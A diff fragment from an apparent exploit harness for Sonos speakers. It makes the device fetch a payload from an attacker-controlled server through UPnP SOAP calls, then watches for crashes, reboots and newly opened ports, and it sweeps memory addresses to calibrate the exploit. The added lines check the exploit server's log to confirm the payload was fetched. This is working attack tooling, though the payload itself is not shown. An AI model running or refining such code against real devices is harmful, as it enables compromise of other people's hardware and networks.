@@ -157,6 +157,7 @@ def fire_and_watch(device, payload_name, S, host=None, port=8981,
               f"<CurrentURI>{url}</CurrentURI><CurrentURIMetaData>{_didl(url, proto)}</CurrentURIMetaData>")
     p2 = play_until(device)
     log(f"fired {payload_name} at {S:06x} proto={proto} (s1={c1}/play={p1} s2={c2}/play={p2})")
+
     t0 = time.time(); losses = 0; max_down = 0; down = 0; opened = {}
     while time.time() - t0 < watch_s:
         time.sleep(1)
@@ -169,6 +170,15 @@ def fire_and_watch(device, payload_name, S, host=None, port=8981,
                 log(f"PORT {p} OPEN after {opened[p]}s")
     verdict = ("REBOOT" if losses >= 20 else "crash" if max_down >= 2 else "clean")
     log(f"watch done: icmp_losses={losses} max_http_down={max_down}s ports={opened} verdict={verdict}")
+    # A "successful" SOAP exchange proves nothing if the device never fetched (the 192.168.4.200-alias
+    # trap: SetAVTransportURI 200, Play 701, zero requests). Require the fetch, loudly.
+    try:
+        fetched = open("/tmp/sonos-exploit-server.log").read().count(payload_name)
+    except FileNotFoundError:
+        fetched = 0
+    if not fetched:
+        log(f"WARNING: device never fetched {payload_name} — EMPTY fire "
+            f"(is {host} reachable from {device}? set SONOS_EXPLOIT_HOST)")
     return verdict, opened
 
 def calibrate(device, lo=0x700000, hi=0x71c000, step=0x400, host=None,
